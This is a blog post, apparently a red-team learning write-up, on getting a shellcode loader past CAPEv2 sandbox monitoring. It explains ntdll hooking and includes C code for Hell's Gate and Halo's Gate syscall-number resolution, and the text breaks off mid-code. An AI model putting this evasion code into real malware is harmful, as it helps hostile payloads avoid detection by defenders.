@@ -1,0 +1,956 @@
+<!DOCTYPE html>
+<html class="" lang="en-us"><head>
+    
+    <meta name="robots" content="noai, noimageai">
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            Against Runtime Analysis: Sandboxes, Syscalls and Hooks  &ndash;
+        
+        ashtrace | blog
+    </title>
+
+    
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
+
+    
+    
+    <link type="text/css" rel="stylesheet" href=https://ashtrace.github.io/css/styles.abbd6311bb4b6ca58f8e7398140529245ae0f6428b759fcd830742eee2619eabb900ba9914a9affb82aa9a16a9b9ea727bb315315a976a0db0e7513a5f12c504.css integrity="sha512-q71jEbtLbKWPjnOYFAUpJFrg9kKLdZ/NgwdC7uJhnqu5ALqZFKmv&#43;4Kqmhapuepye7MVMVqXag2w51E6XxLFBA==" />
+<meta name="author" content="Aishwarya Raj" />
+
+    
+        <meta name="keywords" content='malware development, programming, red team' />
+    
+    
+        <meta name="description" content="l &amp;lsquo;0&amp;rsquo; score is satisfying, it isn&amp;rsquo;t pragmatic to live in that world, as VT limits itself to static IoCs. Thus, naturally the next challenge was defeating runtime analysis. To build the runtime analysis lab I used &lt;a href=&#34;https://github.com/kevoreilly/CAPEv2&#34;&gt;CAPEv2 sandbox&lt;/a&gt; and then tried to defeat its instrumentation capabilities through Halo&amp;rsquo;s Gate and Indirect Syscalls. I further explored Parent Process Spoofing and Mitigation policies to restrict monitoring DLLs.&lt;/p&gt;" />
+    
+
+<meta property="og:site_name"
+    content='ashtrace | blog' />
+
+    <meta property="og:title" content="Against Runtime Analysis: Sandboxes, Syscalls and Hooks" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="Aishwarya Raj" />
+    
+    <meta
+        property="article:published_time"
+        content='2026-05-31T06:16:51Z-0400' />
+    
+        
+            <meta property="article:tag" content="malware development" />
+        
+            <meta property="article:tag" content="programming" />
+        
+            <meta property="article:tag" content="red team" />
+        
+    
+    <meta property="og:url" content="https://ashtrace.github.io/posts/sandboxes_syscalls_and_hooks/" />
+    
+    
+    <meta property="og:image"
+        content="https://ashtrace.github.io/icon512.png" />
+    
+        <meta property="og:description" content="&lt;p&gt;While a VirusTotal &amp;lsquo;0&amp;rsquo; score is satisfying, it isn&amp;rsquo;t pragmatic to live in that world, as VT limits itself to static IoCs. Thus, naturally t" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='ashtrace.github.io'
+/>
+<meta property="twitter:url" content="https://ashtrace.github.io/posts/sandboxes_syscalls_and_hooks/" />
+
+
+    <meta name="twitter:title" content="Against Runtime Analysis: Sandboxes, Syscalls and Hooks" />
+    
+    
+    
+    <meta name="twitter:image"
+        content="https://ashtrace.github.io/icon512.png" />
+    
+        <meta name="twitter:description" content="&lt;p&gt;While a VirusTotal &amp;lsquo;0&amp;rsquo; score is satisfying, it isn&amp;rsquo;t pragmatic to live in that world, as VT limits itself to static IoCs. Thus, naturally t" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' alt='Logo'/>
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">ashtrace | blog</a>
+                        
+                    </h1>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts/">Posts</a></li>
+        
+        
+        
+        
+        
+        
+        
+            <li><a href="/tags/">Tags</a></li>
+        
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <span class="nerdlink" onclick="newSearch();">&#xf002;</span>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search/?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="/index.xml">
+    
+    
+        &#xf09e;
+    
+    <span>
+        RSS
+    </span>
+</a>
+
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/ashtrace">
+    
+    
+        &#xf09b;
+    
+    <span>
+        GitHub
+    </span>
+</a>
+
+    </div>
+    
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>Against Runtime Analysis: Sandboxes, Syscalls and Hooks</h1>
+    
+    
+        <p class="date">
+            <span title='Date'>󰃭 </span>
+    2026-05-31
+
+
+        </p>
+    
+    
+    
+    
+    <div><p>While a VirusTotal &lsquo;0&rsquo; score is satisfying, it isn&rsquo;t pragmatic to live in that world, as VT limits itself to static IoCs. Thus, naturally the next challenge was defeating runtime analysis. To build the runtime analysis lab I used <a href="https://github.com/kevoreilly/CAPEv2">CAPEv2 sandbox</a> and then tried to defeat its instrumentation capabilities through Halo&rsquo;s Gate and Indirect Syscalls. I further explored Parent Process Spoofing and Mitigation policies to restrict monitoring DLLs.</p>
+<h2 id="installing-cape">Installing CAPE</h2>
+<p>While my first choice was to integrate the CAPE environment with my SOC-Lab, nested virtualization was severe a roadblock, so I used a secondary machine to install CAPE on host.</p>
+<p>I followed the steps mentioned in the CAPE documentation for <a href="https://capev2.readthedocs.io/en/latest/installation/host/installation.html">Installing CAPE</a> for Ubuntu 22.04 LTS and <a href="https://capev2.readthedocs.io/en/latest/installation/guest/index.html">Preparing the Guest</a> for Windows 10.</p>
+<p>I&rsquo;d strongly recommend to use Ubuntu 22.04 LTS as the host OS as I faced challenges with the monolithic installation scripts on other OSs (particularly Kali Linux).</p>
+<blockquote>
+<p>As I wasn&rsquo;t planning to set up a hardcore malware analysis lab and wanted to just play with the instrumentations, I went with default options. Wherever the scripts asked to change <code>&lt;WOOT&gt;</code>, I used one of the options from the examples attached.</p>
+</blockquote>
+<h2 id="back-to-the-start">Back to the Start</h2>
+<p>I started with the loader I developed by the end of the <a href="https://ashtrace.github.io/posts/stripping_iocs/">last blog</a>. I provided it with the URL to a payload to launch calculator and executable name to launch the child process which I leverage in remote mapping injection and APC injection.</p>
+<p>As I detonated the loader, the sandbox easily detected the APC Injection.</p>
+<p><img src="./apc-injection.png" alt="apc-injection"></p>
+<p>The sandbox drew the entire process tree depicting the child process of <code>notepad.exe</code> created by my loader and the <code>calc.exe</code> executable finally launched at the end.</p>
+<p><img src="./netutil-process-tree.png" alt="netutil-process-tree"></p>
+<p>Skimming through the function calls traced during analysis, I discovered the sequence that showed the loader&rsquo;s operations as is:</p>
+<p><img src="./netutil-nt-function-sequence.png" alt="netutil-nt-function-sequence"></p>
+<table>
+  <thead>
+      <tr>
+          <th>Function in Source Code</th>
+          <th>Intercepted Call</th>
+          <th>Used by the Loader for</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>CreateProcessW</td>
+          <td>CreateProcessInternalW</td>
+          <td>To create the child process from argument #2 (here <code>notepad.exe</code>) in a suspended state for APC Injection</td>
+      </tr>
+      <tr>
+          <td>CreateFileMappingW</td>
+          <td>NtCreateSection</td>
+          <td>To create a section of memory for remote-mapping injection</td>
+      </tr>
+      <tr>
+          <td>MapViewOfFile</td>
+          <td>NtMapViewOfSection</td>
+          <td>To map a writable view of memory section from previous call; used to write the payload in parent process</td>
+      </tr>
+      <tr>
+          <td>MapViewOfFile2 / MapViewOfFileNuma2</td>
+          <td>NtMapViewOfSection</td>
+          <td>To map an executable view of memory section in child process to run the payload written by parent process</td>
+      </tr>
+      <tr>
+          <td>QueueUserAPC</td>
+          <td>NtQueueApcThread</td>
+          <td>Schedule an asynchronous procedure call to be executed as soon as the child process is removed from the suspended state.</td>
+      </tr>
+      <tr>
+          <td>DebugActiveProcessStop</td>
+          <td>NtOpenProcess</td>
+          <td>Resume the process from a suspended state (see the <code>PROCESS_SUSPEND_RESUME</code> flag).</td>
+      </tr>
+  </tbody>
+</table>
+<p>As you can see that the loader sang as a cuckoo.</p>
+<h2 id="deep-within-the-matryoshka-dolls">Deep within the Matryoshka Dolls</h2>
+<p>Unlike the WinAPI calls used by us in the source code, almost all the functions intercepted by the sandbox started with <code>Nt</code> although with the same parameters  originally provided by us.</p>
+<p>It all starts with the architecture of Microsoft Windows OS. A simple view is as follows (<a href="https://stl-tec.de/tutorials/WinReverseEng/windowsArchitecture/"><em>image credit</em></a>)</p>
+<p><img src="./windows-architecture.png" alt="windows-architecture">.</p>
+<p>User processes (such as our loader) leverage WinAPI functions provided by Subsystem DLLs (such as <code>KERNEL32.dll</code> providing <code>MapViewOfFile</code>) which build upon the procedures provided by <code>NTDLL.dll</code> (<code>MapViewOfFile</code> using <code>NtMapViewOfSection</code> internally) to provide access to internal features of OS. These procedures provided by <code>NTDLL.dll</code> are aptly prefixed by <code>Nt</code> (or <code>Zw</code>, read more <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-nt-and-zw-versions-of-the-native-system-services-routines">here</a>) and are called Native API.</p>
+<p>The end of a user land function call is designated by the <code>syscall</code> instruction within each of the Native APIs where the control is transferred to kernel mode, which performs tasks and returns the result.</p>
+<p>Thus the Native API functions in <code>NTDLL.dll</code> are the ultimate sink where every function lands before the kernel operates on the request and thus the CAPE sandbox leverages this single entry-gate to eavesdrop on the operations by hooking on the function calls just before <code>syscall</code> instruction is executed.</p>
+<p>These Native API functions are also called as syscall stubs - <code>syscall</code> being the instruction defining their existence and they are stub because they simply act as a wrapper to call the corresponding kernel routine to perform the required task in the privileged kernel mode. More often than not, these stubs have a generic design. Each kernel routine is defined by a unique number called System Service Number (SSN) or simply syscall number.</p>
+<ul>
+<li>Copy the function parameter in <code>RCX</code> register to protect against mangling</li>
+<li>Move the System Service Number into the <code>EAX</code> register.</li>
+<li>Execute <code>SYSCALL</code> to transfer control to the kernel</li>
+<li><code>RET</code>urn with the result.</li>
+</ul>
+<p>Following are syscall stubs for <code>NtMapViewOfSection</code>, <code>ZwAccessCheckAndAuditAlarm</code> , <code>NtUnmapViewOfSection</code> and others.</p>
+<p><img src="./ntdll-syscall-stubs.png" alt="ntdll-syscall-stubs"></p>
+<h3 id="hooking-onto-you">Hooking onto you</h3>
+<p>A function hook replaces the first few instructions from the syscall stub with an unconditional jump (<code>jmp</code> instruction) to an inspection procedure that looks upon and interacts with the parameters passed to the Native API call.</p>
+<p>Thus an original stub changes from</p>
+<pre tabindex="0"><code>4C:8BD1                          | mov r10,rcx                                    |
+B8 50000000                      | mov eax,50                                     | SSN = 0x50
+0F05                             | syscall                                        |
+C3                               | ret                                            |
+</code></pre><p>to</p>
+<pre tabindex="0"><code>49:BA 1811A398F77F0000           | mov r10, 7FF798A31118                          | Inspection function address = 0x00007ff798a31118
+41:FFE2                          | jmp r10                                        | Always go through the inspection function
+</code></pre><h2 id="anti-nt-analysis">Anti Nt-Analysis</h2>
+<p>While the SSN for Native API is not constant and may change between each build, it is always allocated incrementally i.e. the first Native API will have SSN 0, followed by SSN 1 and so on &hellip;, this is cleverly used by <a href="https://github.com/jthuraisamy/Syswhispers2"><code>SysWhispers2</code></a> to resolve SSNs.</p>
+<p>Notice, in the previous section, how each syscall stub has the same instruction except for the SSN. Thus, each syscall stub has the same assembly bytecode except for the SSN. This can be leveraged to search the entire <code>NTDLL.dll</code> memory region for the exact byte-sequence of <code>0x4c</code>, <code>0x8b</code>, <code>0xd1</code>, <code>0xb8</code> at the start of the syscall-stub.</p>
+<p>This serial searching of byte-sequence helps to retrieve the SSN from the Native API&rsquo;s bytecode and is known as the <a href="https://github.com/am0nsec/HellsGate">Hell&rsquo;s Gate</a> approach.</p>
+<p>The search logic looks like the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Quick and dirty fix in case the function has been hooked
+</span></span></span><span style="display:flex;"><span>WORD cw <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (TRUE) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// check if syscall, in this case we are too far
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0f</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x05</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// check if ret, in this case we are also probaly too far
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xc3</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// First opcodes should be :
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">//    MOV R10, RCX
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">//    MOV RCX, &lt;syscall&gt;
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4c</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8b</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xd1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xb8</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>) {
+</span></span><span style="display:flex;"><span>        BYTE high <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> cw);
+</span></span><span style="display:flex;"><span>        BYTE low <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> cw);
+</span></span><span style="display:flex;"><span>        pVxTableEntry<span style="color:#f92672">-&gt;</span>wSystemCall <span style="color:#f92672">=</span> (high <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> low;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    cw<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>The <code>high &lt;&lt; 8 | low</code> operation helps to reconstruct the SSN number from the 4th and 5th byte of the syscall stub.</p>
+<p>But if any Native API has been tampered with hooking, the bytecode comparisons would fail and SSN won&rsquo;t be calculated.</p>
+<h3 id="halo-of-the-gods">Halo of the Gods</h3>
+<p>While Hell&rsquo;s Gate would help me identify and avoid hooked Native APIs, it does not provide me with a way to retrieve their SSN. Thus, if a function is hooked, there is no way to execute it and my operations stop there.</p>
+<p>This problem can be solved by the Halo&rsquo;s Gate approach which combines the SysWhisper2&rsquo;s theory with the Hell&rsquo;s Gate search. As each SSN is allocated in incremental order, on encountering a hooked syscall stub I can search forward beyond the <code>syscall</code> and <code>ret</code>s while counting the numbers of stubs I&rsquo;ve encountered. Wherever I found an unhooked stub with SSN, I just subtract the numbers of stubs I walked from my target function to get here. The same can be done by searching backwards and adding the number of syscall stubs encountered.</p>
+<p>A pictorial visualization (generated with AI) of the search is as follows:</p>
+<p><img src="./halos-gate.png" alt="halos-gate"></p>
+<p>The operation <code>(high &lt;&lt; 8 | low) +/- idx</code> builds upon the Hell&rsquo;s Gate SSN calculation by adding or subtracting the number of indexes one had to move to land to an unhooked stub (counted by <code>idx</code> variable).</p>
+<p>Programmatically, the search logic appears as following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (WORD cx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; cx <span style="color:#f92672">&lt;</span> pImageExportDirectory<span style="color:#f92672">-&gt;</span>NumberOfNames; cx<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>    PCHAR pczFunctionName <span style="color:#f92672">=</span> (PCHAR)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pdwAddressOfNames[cx]);
+</span></span><span style="display:flex;"><span>    PVOID pFunctionAddress <span style="color:#f92672">=</span> (PBYTE)pModuleBase <span style="color:#f92672">+</span> pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (pczFunctionName <span style="color:#f92672">==</span> TargetFunctionName) {
+</span></span><span style="display:flex;"><span>        pVxTableEntry<span style="color:#f92672">-&gt;</span>pAddress <span style="color:#f92672">=</span> pFunctionAddress;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// First opcodes should be :
+</span></span></span><span style="display:flex;"><span>        <span style="color:#75715e">//    MOV R10, RCX
+</span></span></span><span style="display:flex;"><span>        <span style="color:#75715e">//    MOV RAX, &lt;syscall&gt;
+</span></span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4c</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8b</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xd1</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xb8</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            BYTE high <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>);
+</span></span><span style="display:flex;"><span>            BYTE low <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>            pVxTableEntry<span style="color:#f92672">-&gt;</span>wSystemCall <span style="color:#f92672">=</span> (high <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> low;
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">//if hooked check the neighborhood to find clean syscall
+</span></span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xe9</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (WORD idx <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; idx <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">500</span>; idx<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// check neighboring syscall down
+</span></span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> DOWN) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4c</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> DOWN) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8b</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> DOWN) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xd1</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> DOWN) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xb8</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> DOWN) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> DOWN) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>) {
+</span></span><span style="display:flex;"><span>                    BYTE high <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> DOWN);
+</span></span><span style="display:flex;"><span>                    BYTE low <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> DOWN);
+</span></span><span style="display:flex;"><span>                    pVxTableEntry<span style="color:#f92672">-&gt;</span>wSystemCall <span style="color:#f92672">=</span> (high <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> low <span style="color:#f92672">-</span> idx;
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// check neighboring syscall up
+</span></span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> UP) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4c</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> UP) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8b</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> UP) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xd1</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> UP) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xb8</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> UP) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> UP) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>) {
+</span></span><span style="display:flex;"><span>                    BYTE high <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> UP);
+</span></span><span style="display:flex;"><span>                    BYTE low <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> UP);
+</span></span><span style="display:flex;"><span>                    pVxTableEntry<span style="color:#f92672">-&gt;</span>wSystemCall <span style="color:#f92672">=</span> (high <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> low <span style="color:#f92672">+</span> idx;
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xe9</span>) {
